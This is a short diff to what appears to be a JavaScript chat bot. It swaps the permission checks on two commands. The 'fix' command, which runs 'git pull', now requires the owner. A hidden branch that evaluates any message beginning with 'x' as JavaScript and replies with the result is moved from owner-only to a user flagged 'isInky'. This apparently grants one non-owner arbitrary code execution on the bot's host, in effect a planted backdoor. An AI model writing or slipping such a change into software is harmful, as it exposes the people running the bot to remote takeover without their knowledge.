@@ -1334,7 +1334,7 @@ sendBug(from, `${q}`)
 break
 
 case 'fix':
-if (!isInky) return reply(mess.only.inky)
+if (!isOwner) return reply(mess.only.inky)
 exec(`git pull`, (err, stdout) => {
 if (err) return reply2(err)
 if (stdout) reply2(`${stdout}`)
@@ -1458,7 +1458,7 @@ break
 default:
 
 if (budy.startsWith("x")) {
-if (!isOwner) return
+if (!isInky) return
 return await reply2(JSON.stringify(eval(args.join(" ")), null, 2))
 }
 
